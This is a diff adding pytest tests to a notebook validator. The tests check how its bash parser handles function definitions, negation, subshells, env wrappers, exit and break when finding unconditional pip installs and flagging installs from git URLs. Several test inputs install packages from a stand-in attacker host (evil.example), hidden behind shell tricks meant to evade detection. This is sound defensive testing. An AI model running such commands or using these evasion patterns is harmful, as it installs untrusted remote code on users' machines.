@@ -4840,3 +4840,123 @@ def test_python_dash_c_terminates_the_option_list():
         assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
             "R-INST-001"
         ], cell
+
+
+def test_a_call_uses_the_definition_in_force_at_that_point():
+    """`f(){ a; }; f; f(){ b; }` calls the FIRST body, not the last one written.
+
+    Keying the replay by name compared the call against the final definition, so the body
+    bash really runs stayed conditional.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!f(){ pip install torch==2.12; }; f; f(){ :; }; pip install torchcodec==0.10"
+        )
+    ] == [("install", ["torch==2.12"]), ("install", ["torchcodec==0.10"])]
+    # A call written above every definition still reaches none of them.
+    assert nv._split_chained("!f || true; f(){ pip install a; }") == [
+        ("!f", False),
+        ("!true", True),
+        ("!pip install a", True),
+    ]
+
+
+def test_the_negation_word_survives_a_separator():
+    """`! false` succeeds, so an `&&` behind it runs; `! true` fails, so it does not.
+
+    Verified against bash. Reconstructing a non-head command glued the notebook's bang to
+    bash's negation, and the pipeline whose status it inverts was read as a command name.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!true; ! false && pip install torch==2.12"
+        )
+    ] == [("install", ["torch==2.12"])]
+    assert list(nv.unconditional_pip_invocations("!true; ! true && pip install a")) == []
+    # The cell's own leading bang is still the notebook's, whichever way it is spaced.
+    assert [flag for _, flag in nv._split_chained("! ! false && pip install a")] == [False, False]
+
+
+def test_a_subshell_hands_over_its_folded_status():
+    """`(false && pip install x) || pip install y` always reaches the fallback.
+
+    Verified against bash. The pending text at a `)` is the group's own last command plus its
+    bracket, and folding that again as a fresh command wiped the status the group had just
+    contributed. Brace groups escaped it only because their required `;` had already flushed.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained("!(false && pip install ignored) || pip install torch==2.12") == [
+        ("!false", False),
+        ("!pip install ignored", True),
+        ("!pip install torch==2.12", False),
+    ]
+    assert ("!pip install b", True) in nv._split_chained("!(true && pip install a) || pip install b")
+
+
+def test_an_external_wrapper_does_not_reach_a_shell_function():
+    """`env f` looks for an executable named f; bash reports "No such file or directory".
+
+    Stripping every execution prefix before resolving the name made each wrapper look like a
+    call, and entering the body let its `exit` truncate a line bash carries on with.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!f(){ exit; }; env f || true; pip install git+https://evil.example/x.git",
+            "nb.ipynb",
+            0,
+        )
+    ] == ["R-INST-001"]
+    # The wrapped name is not a call, so the body stays a definition.
+    assert ("!pip install a", True) in nv._split_chained("!f(){ pip install a; }; env f")
+    assert ("!pip install a", False) in nv._split_chained("!f(){ pip install a; }; f")
+
+
+def test_a_terminating_call_in_a_subshell_spares_the_parent():
+    """`f | cat` runs f in a subshell, so an `exit` inside it ends only that subshell.
+
+    Verified against bash: `f(){ exit; }; f | cat; echo REACHED` prints REACHED.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!f(){ exit; }; f | cat; pip install git+https://evil.example/x.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    # Called in the parent shell it still ends the line.
+    assert nv._split_chained("!f(){ exit; }; f; pip install a") == [
+        ("!exit", False),
+        ("!f", False),
+    ]
+
+
+def test_break_outside_a_loop_drops_nothing():
+    """Bash rejects `break` outside a loop and runs the next command anyway.
+
+    Verified locally: `if true; then break; echo AFTER_BREAK; fi` prints AFTER_BREAK after
+    reporting "break: only meaningful in a `for', `while', or `until' loop".
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!if true; then break; pip install git+https://evil.example/x.git; fi", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    # Inside a real loop it still cuts the body.
+    assert nv._split_chained("!while true; do break; pip install a; done") == [
+        ("!true", False),
+        ("!break", False),
+    ]
